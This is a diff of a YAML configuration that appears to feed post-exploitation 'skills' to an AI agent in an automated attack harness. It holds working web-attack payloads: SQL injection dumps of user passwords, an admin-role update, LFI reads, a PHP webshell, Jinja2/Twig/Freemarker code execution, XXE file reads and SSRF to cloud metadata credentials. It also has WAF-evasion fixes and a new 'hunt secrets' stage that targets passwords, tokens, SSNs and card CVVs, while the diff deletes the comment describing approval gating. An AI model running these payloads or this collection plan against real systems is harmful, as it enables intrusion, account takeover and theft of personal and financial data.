@@ -1,180 +1,196 @@
-# Post-exploitation for WEB vulnerabilities — the "loot" step, as data.
-#
-# WHY THIS IS SEPARATE FROM THE vuln_class_methodology SKILL
-#   The vuln-class methodology proves a primitive is exploitable and is READ-ONLY
-#   by contract ("one version/marker row proves exploitability; do NOT dump tables
-#   or modify data"). Weaponizing a CONFIRMED exploit — dumping the database,
-#   reading a target file, dropping a webshell — READS/MODIFIES the target, so it
-#   is a different phase with a different authorization posture. It runs as a
-#   GATED FOLLOW-ON from an `exploit_confirmed:<class>` fact, through the impactful/
-#   approval lane, never as part of proving the vuln.
-#
-# THIS IS A SKILL
-#   Retrieved by class (common/vuln_skills.postex_for / postex_block, the
-#   get_web_postex tool) and embedded into RAG (etl/load_knowledge_documents.
-#   _render_postex_web) so the planner can recall it. Edit here, not in code.
-#
-# PROOF = REAL EXTRACTED DATA
-#   The objective is DB-COMPUTED / target-resident data that was NOT in the
-#   request (a version string, a table row, file contents, command output) — this
-#   is un-reflectable (defeats the reflection false-positive that dogs a literal
-#   canary) AND is what an outcome-based evaluator actually scores.
-
 version: 1
-
 classes:
   sqli:
-    objective: "Extract data (or modify it) through the confirmed SQL injection."
-    weaponize: >-
-      Fingerprint first: extract a DB-COMPUTED value the request never contained —
-      ' UNION SELECT version(),current_user,database()-- , or error-based
-      updatexml(1,concat(0x7e,(select version()),0x7e),1). Then reach the objective:
-      dump creds (' UNION SELECT group_concat(user_login,0x3a,user_pass) FROM wp_users--
-      / FROM users), read the target/secret table (' UNION SELECT message FROM secret--),
-      or read a file if FILE priv (' UNION SELECT LOAD_FILE('/path/to/secret')--). To
-      MODIFY: stacked query '; UPDATE users SET role='admin' WHERE id=1-- (only if the
-      objective is data modification). Match the injection style already confirmed
-      (error/union/boolean/time) and the DB fingerprint. Prefer sqlmap
-      --batch --dump -T <table> when a manual UNION is fiddly.
-    proof: "DB-computed data in the response (version / current_user / real table rows) that was never in the request."
-
+    objective: Extract data (or modify it) through the confirmed SQL injection.
+    weaponize: 'Fingerprint first: extract a DB-COMPUTED value the request never contained — '' UNION SELECT version(),current_user,database()-- , or error-based updatexml(1,concat(0x7e,(select version()),0x7e),1).
+      Then reach the objective: dump creds ('' UNION SELECT group_concat(user_login,0x3a,user_pass) FROM wp_users-- / FROM users), read the target/secret table ('' UNION SELECT message FROM secret--), or
+      read a file if FILE priv ('' UNION SELECT LOAD_FILE(''/path/to/secret'')--). To MODIFY: stacked query ''; UPDATE users SET role=''admin'' WHERE id=1-- (only if the objective is data modification).
+      Match the injection style already confirmed (error/union/boolean/time) and the DB fingerprint. Prefer sqlmap --batch --dump -T <table> when a manual UNION is fiddly.'
+    proof: DB-computed data in the response (version / current_user / real table rows) that was never in the request.
   lfi:
-    objective: "Read the target file(s) through the confirmed LFI / path traversal."
-    weaponize: >-
-      Confirm arbitrary read with a known file (?file=../../../../etc/passwd), then read
-      the OBJECTIVE path (the secret/flag file, config with DB creds, an app source file
-      that leaks a key). PHP wrappers when a raw read is filtered:
-      php://filter/convert.base64-encode/resource=index.php (decode the base64), or
-      data:// / expect:// for RCE where enabled. Log-poison to RCE only if the objective
-      needs code exec.
-    proof: "Target file contents in the response (e.g. the secret/flag, /etc/passwd, DB credentials)."
-
+    objective: Read the target file(s) through the confirmed LFI / path traversal.
+    weaponize: 'Confirm arbitrary read with a known file (?file=../../../../etc/passwd), then read the OBJECTIVE path (the secret/flag file, config with DB creds, an app source file that leaks a key). PHP
+      wrappers when a raw read is filtered: php://filter/convert.base64-encode/resource=index.php (decode the base64), or data:// / expect:// for RCE where enabled. Log-poison to RCE only if the objective
+      needs code exec.'
+    proof: Target file contents in the response (e.g. the secret/flag, /etc/passwd, DB credentials).
   file_upload:
-    objective: "Achieve RCE (or drop the objective artifact) via the confirmed arbitrary upload."
-    weaponize: >-
-      Upload a minimal webshell to a web-served, executable path
-      (<?php system($_GET['c']); ?> as shell.php; bypass filters with double
-      extensions, content-type spoofing, or a .htaccess handler), then request it:
-      GET /uploads/shell.php?c=id. If the objective is to run a specific binary, exec
-      it (?c=/tmp/pwn). Confirm the write path from the upload response or a predictable
-      uploads dir.
-    proof: "Command output from the uploaded shell (uid=/gid= from id) or the target binary's effect."
-
+    objective: Achieve RCE (or drop the objective artifact) via the confirmed arbitrary upload.
+    weaponize: 'Upload a minimal webshell to a web-served, executable path (<?php system($_GET[''c'']); ?> as shell.php; bypass filters with double extensions, content-type spoofing, or a .htaccess handler),
+      then request it: GET /uploads/shell.php?c=id. If the objective is to run a specific binary, exec it (?c=/tmp/pwn). Confirm the write path from the upload response or a predictable uploads dir.'
+    proof: Command output from the uploaded shell (uid=/gid= from id) or the target binary's effect.
   command_injection:
-    objective: "Run the objective command via the confirmed command injection."
-    weaponize: >-
-      Escalate from proof to the objective: read the target file (; cat /path/secret),
-      run the target binary (; /tmp/pwn), or establish a reverse/bind shell for
-      interactive access if the objective needs it. Use the separator already confirmed
-      (; | && $() backticks) and URL/space bypasses (${IFS}) as needed.
-    proof: "Objective command output in the response (file contents, id, or the binary's effect)."
-
+    objective: Run the objective command via the confirmed command injection.
+    weaponize: 'Escalate from proof to the objective: read the target file (; cat /path/secret), run the target binary (; /tmp/pwn), or establish a reverse/bind shell for interactive access if the objective
+      needs it. Use the separator already confirmed (; | && $() backticks) and URL/space bypasses (${IFS}) as needed.'
+    proof: Objective command output in the response (file contents, id, or the binary's effect).
   ssti:
-    objective: "Reach RCE / read data through the confirmed template injection."
-    weaponize: >-
-      From the confirmed engine, jump to RCE: Jinja2
-      {{ cycler.__init__.__globals__.os.popen('id').read() }} or
-      {{ config.__class__.__init__.__globals__['os'].popen('cat /path/secret').read() }};
-      Twig {{ ['id']|filter('system') }}; Freemarker
-      <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}. Run the objective
-      command / read the objective file.
-    proof: "Command output or target file contents rendered in the response (never a literal we sent)."
-
+    objective: Reach RCE / read data through the confirmed template injection.
+    weaponize: 'From the confirmed engine, jump to RCE: Jinja2 {{ cycler.__init__.__globals__.os.popen(''id'').read() }} or {{ config.__class__.__init__.__globals__[''os''].popen(''cat /path/secret'').read()
+      }}; Twig {{ [''id'']|filter(''system'') }}; Freemarker <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}. Run the objective command / read the objective file.'
+    proof: Command output or target file contents rendered in the response (never a literal we sent).
   xxe:
-    objective: "Read the target file / SSRF via the confirmed XXE."
-    weaponize: >-
-      In-band: <!DOCTYPE r [<!ENTITY x SYSTEM 'file:///path/secret'>]> then reference &x;
-      in a reflected field. Filtered/binary: PHP base64 wrapper
-      (php://filter/convert.base64-encode/resource=/path). Blind/OOB: an external DTD that
-      exfils the file to a collaborator you control. Or hit an internal service (SSRF) if
-      that is the objective.
-    proof: "Target file contents (or the internal service's response) in the reply / OOB callback."
-
+    objective: Read the target file / SSRF via the confirmed XXE.
+    weaponize: 'In-band: <!DOCTYPE r [<!ENTITY x SYSTEM ''file:///path/secret''>]> then reference &x; in a reflected field. Filtered/binary: PHP base64 wrapper (php://filter/convert.base64-encode/resource=/path).
+      Blind/OOB: an external DTD that exfils the file to a collaborator you control. Or hit an internal service (SSRF) if that is the objective.'
+    proof: Target file contents (or the internal service's response) in the reply / OOB callback.
   idor:
-    objective: "Access the other user's / object's data via the confirmed IDOR."
-    weaponize: >-
-      Enumerate the identifier that was confirmed manipulable (increment/replace the id,
-      GUID, or filename) to reach the OBJECTIVE record — the admin's data, another
-      tenant's file, the secret object. Batch a small range to demonstrate scope.
-    proof: "Another principal's data returned (the objective record/file that the current user should not see)."
-
+    objective: Access the other user's / object's data via the confirmed IDOR.
+    weaponize: Enumerate the identifier that was confirmed manipulable (increment/replace the id, GUID, or filename) to reach the OBJECTIVE record — the admin's data, another tenant's file, the secret object.
+      Batch a small range to demonstrate scope.
+    proof: Another principal's data returned (the objective record/file that the current user should not see).
   ssrf:
-    objective: "Reach the internal target via the confirmed SSRF."
-    weaponize: >-
-      Point the confirmed SSRF at the objective: an internal service
-      (http://127.0.0.1:<port>/), a cloud metadata endpoint
-      (http://169.254.169.254/latest/meta-data/ or the GCP/Azure equivalent for creds),
-      or a file (file:///path/secret where the fetcher allows it). Use gopher:// to speak
-      to a non-HTTP internal service if the objective needs it.
-    proof: "The internal resource's response / metadata credentials returned via the vulnerable fetcher."
-
-# ── Error-analysis / correction / collection METHODOLOGY (class-agnostic) ──────────
-# The two-phase weaponization skill, as DATA: how to diagnose a failing web exploit from
-# its error output and correct it, then collect the objective. The runner loads error_fixes
-# / tweaks from here (common/vuln_skills.postex_error_analysis) — edit here, not in code —
-# and they are embedded into RAG (etl/load_knowledge_documents._render_postex_web).
+    objective: Reach the internal target via the confirmed SSRF.
+    weaponize: 'Point the confirmed SSRF at the objective: an internal service (http://127.0.0.1:<port>/), a cloud metadata endpoint (http://169.254.169.254/latest/meta-data/ or the GCP/Azure equivalent
+      for creds), or a file (file:///path/secret where the fetcher allows it). Use gopher:// to speak to a non-HTTP internal service if the objective needs it.'
+    proof: The internal resource's response / metadata credentials returned via the vulnerable fetcher.
 error_analysis:
-  methodology: >-
-    Weaponize in TWO phases. PHASE 1 — CORRECT: make the exploit EXECUTE and return a test
-    value (version() / current_user delimited as ~<value>~). Diagnose the ROOT CAUSE from the
-    error text, do not just retry: integer vs quoted context, wrong comment terminator, wrong
-    technique, or a WAF. PHASE 2 — COLLECT (agent): reuse the WORKING payload and change only
-    the subquery to reach the objective; enumerate columns/tables from information_schema
-    first, page truncated error-based values, and group_concat all rows.
-  # match = a regex tested (case-insensitive) against the command's output; fix = the guidance.
+  methodology: 'Weaponize in TWO phases. PHASE 1 — CORRECT: make the exploit EXECUTE and return a test value (version() / current_user delimited as ~<value>~). Diagnose the ROOT CAUSE from the error text,
+    do not just retry: integer vs quoted context, wrong comment terminator, wrong technique, or a WAF. PHASE 2 — COLLECT (agent): reuse the WORKING payload and change only the subquery to reach the objective;
+    enumerate columns/tables from information_schema first, page truncated error-based values, and group_concat all rows.'
   error_fixes:
-    - match: "different number of columns|the used select statements have a different number|column count"
-      fix: "UNION column-count mismatch: change the number of NULLs to match. Find the count with ORDER BY N-- (increase N until it errors), then UNION SELECT that many columns."
-    - match: "near [\"']{2,}|near [\"'] ?(and|or|union|updatexml|extractvalue|--|#|,)|near [\"']\\s*$"
-      fix: "STRAY QUOTE right at the injection point — the parameter is almost certainly NUMERIC/integer context. DROP the surrounding quote: id=1 AND updatexml(...) (NOT id=1' AND ...). Remove the quote from EVERY payload."
-    - match: "xpath syntax error|extractvalue|updatexml|~[^~\\s]{1,40}~"
-      fix: "Error-based works: extract ONE value per request (updatexml/extractvalue truncate ~32 chars — use substring(...,1,32), substring(...,33,32) to page longer values)."
-    - match: "you have an error in your sql syntax|unterminated|unclosed quotation|quoted string not properly"
-      fix: "Syntax broke: fix the quote/comment terminator (-- - vs #), or switch technique (union -> error-based -> boolean -> time). If the error echoes a stray quote at your marker, the param is numeric — drop the quote entirely."
-    - match: "you have an error in your sql syntax.*near [\"'`]?(user|order|group|table|column|key|desc|asc|primary|index|values|references|check|default|constraint)[\"'`]?( |$)"
-      fix: "The table/column name is a SQL RESERVED WORD (e.g. user, order, group, key) — BACKTICK-quote it in MySQL/MariaDB: FROM `user`, SELECT `key`, `order`. (Postgres/SQLite use double-quotes: FROM \"user\".) Re-issue the same query with the identifier quoted."
-    - match: "unknown column|no such column|invalid column name"
-      fix: "Wrong column name: enumerate columns from information_schema.columns WHERE table_name='<t>' (MySQL/PG) or PRAGMA table_info (SQLite)."
-    - match: "table.*(doesn'?t exist|not found)|no such table|invalid object name"
-      fix: "Wrong table: enumerate tables from information_schema.tables (or sqlite_master.name)."
-    - match: "access denied|command denied to user|permission denied|insufficient privileg"
-      fix: "The DB user lacks that privilege (e.g. FILE for LOAD_FILE): pivot to a table you CAN read."
-    - match: "403 forbidden|waf|blocked|not acceptable"
-      fix: "Likely a WAF: encode/obfuscate (comments /**/ , mixed case, URL/hex, 0x literals)."
+  - match: different number of columns|the used select statements have a different number|column count
+    fix: 'UNION column-count mismatch: change the number of NULLs to match. Find the count with ORDER BY N-- (increase N until it errors), then UNION SELECT that many columns.'
+  - match: near ["']{2,}|near ["'] ?(and|or|union|updatexml|extractvalue|--|#|,)|near ["']\s*$
+    fix: 'STRAY QUOTE right at the injection point — the parameter is almost certainly NUMERIC/integer context. DROP the surrounding quote: id=1 AND updatexml(...) (NOT id=1'' AND ...). Remove the quote
+      from EVERY payload.'
+  - match: xpath syntax error|extractvalue|updatexml|~[^~\s]{1,40}~
+    fix: 'Error-based works: extract ONE value per request (updatexml/extractvalue truncate ~32 chars — use substring(...,1,32), substring(...,33,32) to page longer values).'
+  - match: you have an error in your sql syntax|unterminated|unclosed quotation|quoted string not properly
+    fix: 'Syntax broke: fix the quote/comment terminator (-- - vs #), or switch technique (union -> error-based -> boolean -> time). If the error echoes a stray quote at your marker, the param is numeric
+      — drop the quote entirely.'
+  - match: you have an error in your sql syntax.*near ["'`]?(user|order|group|table|column|key|desc|asc|primary|index|values|references|check|default|constraint)["'`]?( |$)
+    fix: 'The table/column name is a SQL RESERVED WORD (e.g. user, order, group, key) — BACKTICK-quote it in MySQL/MariaDB: FROM `user`, SELECT `key`, `order`. (Postgres/SQLite use double-quotes: FROM "user".)
+      Re-issue the same query with the identifier quoted.'
+  - match: unknown column|no such column|invalid column name
+    fix: 'Wrong column name: enumerate columns from information_schema.columns WHERE table_name=''<t>'' (MySQL/PG) or PRAGMA table_info (SQLite).'
+  - match: table.*(doesn'?t exist|not found)|no such table|invalid object name
+    fix: 'Wrong table: enumerate tables from information_schema.tables (or sqlite_master.name).'
+  - match: access denied|command denied to user|permission denied|insufficient privileg
+    fix: 'The DB user lacks that privilege (e.g. FILE for LOAD_FILE): pivot to a table you CAN read.'
+  - match: 403 forbidden|waf|blocked|not acceptable
+    fix: 'Likely a WAF: encode/obfuscate (comments /**/ , mixed case, URL/hex, 0x literals).'
   tweaks:
-    - match: "~[^~]{1,40}~"
-      tweak: "Error-based value is delimited by ~…~ and capped ~32 chars — page the rest with substring(<expr>,33,32), substring(<expr>,65,32), … and concatenate."
-    - match: "[A-Za-z0-9+/]{40,}={0,2}"
-      tweak: "Output looks BASE64 — decode it (| base64 -d) to read the value."
-    - match: "\\b[0-9a-f]{32,}\\b"
-      tweak: "Output looks HEX / a hash — unhex() it, or if it's a password hash that IS the loot (hand it to cracking)."
-    - match: "limit|only .* row|1 row in set|single row"
-      tweak: "Only one row came back — use group_concat()/string_agg() (or LIMIT/OFFSET paging) to get all rows at once."
-
-# ── Data-COLLECTION methodology (Phase 2 agent), as DATA ──────────────────────────
-# Collect in STAGES — never jump straight to data. The collect agent walks this plan
-# (common/vuln_skills.postex_collection); each stage's result feeds the next. Embedded
-# into RAG so the planner can recall the order too.
+  - match: ~[^~]{1,40}~
+    tweak: Error-based value is delimited by ~…~ and capped ~32 chars — page the rest with substring(<expr>,33,32), substring(<expr>,65,32), … and concatenate.
+  - match: '[A-Za-z0-9+/]{40,}={0,2}'
+    tweak: Output looks BASE64 — decode it (| base64 -d) to read the value.
+  - match: \b[0-9a-f]{32,}\b
+    tweak: Output looks HEX / a hash — unhex() it, or if it's a password hash that IS the loot (hand it to cracking).
+  - match: limit|only .* row|1 row in set|single row
+    tweak: Only one row came back — use group_concat()/string_agg() (or LIMIT/OFFSET paging) to get all rows at once.
 collection:
-  methodology: >-
-    Collect systematically, in order, reusing the CORRECTED working payload and changing
-    ONLY the subquery: (1) enumerate TABLES, (2) enumerate COLUMNS of the table that matches
-    the objective (users/secret/flag/config/admin), (3) get the ROW COUNT to size it and
-    confirm read access, (4) DUMP the rows (group_concat, page long values). Do not skip a
-    stage; pick the table/columns whose names match the objective.
+  methodology: 'Collect systematically, in order, reusing the CORRECTED working payload and changing ONLY the subquery: (1) enumerate TABLES, (2) HUNT for tables/columns that look like SECRETS (users/user/account/admin/credential/secret/token/api_key
+    columns matching pass/pwd/hash/secret/token/key/api), (3) enumerate COLUMNS of each target table, (4) get ROW COUNT, (5) DUMP the rows (group_concat, PAGE long values with substring (<expr>,N,32) —
+    error-based caps ~32 chars, so ALWAYS page). Don''t stop at ''one hit'' — dump every likely secret table before giving up. Pick tables/columns whose names match the objective; if the objective is generic,
+    hunt secrets.'
   plan:
-    - stage: tables
-      goal: "list all table names in the current database"
-      subquery: "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"
-      sqlite: "SELECT group_concat(name) FROM sqlite_master WHERE type='table'"
-    - stage: columns
-      goal: "list the columns of the target table (the one that matches the objective)"
-      subquery: "SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<TABLE>'"
-      sqlite: "SELECT group_concat(name) FROM pragma_table_info('<TABLE>')"
-    - stage: row_counts
-      goal: "count rows in the target table to size it and confirm read access"
-      subquery: "SELECT COUNT(*) FROM <TABLE>"
-    - stage: data
-      goal: "dump the objective rows (identifier + secret columns)"
-      subquery: "SELECT group_concat(<COLS> SEPARATOR 0x0a) FROM <TABLE>"
-      note: "error-based caps ~32 chars — page with substring(...,N,32) if the concat is long"
+  - stage: tables
+    goal: list all table names in the current database
+    subquery: SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
+    sqlite: SELECT group_concat(name) FROM sqlite_master WHERE type='table'
+  - stage: columns
+    goal: list the columns of the target table (the one that matches the objective)
+    subquery: SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<TABLE>'
+    sqlite: SELECT group_concat(name) FROM pragma_table_info('<TABLE>')
+  - stage: hunt_secrets
+    goal: SCAN all discovered tables + columns for likely PASSWORD/SECRET targets (pass, pwd, hash, secret, token, key, api_key, cred) and pick the highest-priority ones to dump.
+    subquery: SELECT group_concat(concat(table_name,0x2e,column_name)) FROM information_schema.columns WHERE table_schema=database() AND (column_name REGEXP 'pass|pwd|hash|secret|token|api|key|cred|auth')
+    sqlite: SELECT group_concat(name) FROM pragma_table_info('<TABLE>') WHERE name REGEXP 'pass|pwd|hash|secret|token|api|key|cred|auth'
+    note: This is the CORE hunt — its output IS the target list; feed it into the columns/row_counts/data stages one at a time.
+  - stage: row_counts
+    goal: count rows in the target table to size it and confirm read access
+    subquery: SELECT COUNT(*) FROM <TABLE>
+  - stage: data
+    goal: 'Dump the target rows: usernames, PASSWORDS (hashes), API keys, secrets, tokens — every identifier + secret column. Do NOT stop at one row.'
+    subquery: SELECT group_concat(<COLS> SEPARATOR 0x0a) FROM <TABLE>
+    note: error-based caps ~32 chars — ALWAYS use substring(<expr>,1,32), substring(<expr>,33,32), … and concatenate. If <COLS> is 'pass'/'hash'/'secret'/'token' those ARE the loot — dump every one.
+  secret_targets:
+    table_patterns:
+    - user
+    - users
+    - account
+    - accounts
+    - admin
+    - admins
+    - member
+    - members
+    - credential
+    - credentials
+    - cred
+    - creds
+    - secret
+    - secrets
+    - token
+    - tokens
+    - apikey
+    - api_key
+    - api_keys
+    - key
+    - keys
+    - setting
+    - settings
+    - config
+    - configuration
+    - auth
+    - authentication
+    - session
+    - sessions
+    - password_reset
+    - wp_users
+    - wp_options
+    - oc_users
+    - dev_users
+    - x2_users
+    column_patterns:
+    - password
+    - pass
+    - pwd
+    - passwd
+    - hash
+    - secret
+    - token
+    - key
+    - api_key
+    - apikey
+    - access_token
+    - refresh_token
+    - auth
+    - authtoken
+    - auth_token
+    - credentials
+    - cred
+    - user_pass
+    - user_pw
+    - user_login
+    - email
+    - mail
+    - phone
+    - ssn
+    - credit
+    - card
+    - cvv
+    - private_key
+    - api_secret
+primitives:
+  purpose: Small composable POST-EX skills that CHAIN together. Each is a deterministic harness helper the collect agent invokes by name — the LLM supplies only SQL or a column list, never a curl (which
+    is where most exploitation errors come from).
+  sqli_subquery:
+    description: Splice a SQL SUBQUERY into the corrected error-based template and run it. The harness handles URL-encoding, quoting, and executing; you only pick SQL.
+    args:
+      subquery: the SQL fragment (e.g. SELECT version(), or SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())
+    returns: the extracted ~value~ (up to ~32 chars via error-based) or None
+    chain: Use for exploration and single-value extraction; when the value comes back at 32 chars, chain into sqli_autopage.
+  sqli_autopage:
+    description: 'Deterministically PAGE a truncated error-based value: the harness re-runs the subquery wrapped in substring(<expr>,N,32) chunks and concatenates the pieces. Use this whenever a value came
+      back at ~32 chars.'
+    args:
+      expr: the SQL expression to page — e.g. (SELECT group_concat(concat(username,0x3a,password) SEPARATOR 0x0a) FROM `user`)
+    returns: the fully concatenated string
+    chain: The natural next-step after sqli_subquery returns a 32-char (likely truncated) value.
+  harvest_secret_columns:
+    description: 'DETERMINISTIC filter: given a comma-separated column list, keep only the ones matching secret/password patterns (pass/pwd/hash/secret/token/api/key/cred/auth). Removes the LLM''s chance
+      to prioritize the wrong columns.'
+    args:
+      cols: the column list from information_schema (e.g. id,username,email,password,api_key,created_at)
+    returns: the filtered short list — feed into sqli_autopage as the DUMP target
+    chain: Runs after the columns stage; its output IS the dump target for sqli_autopage.
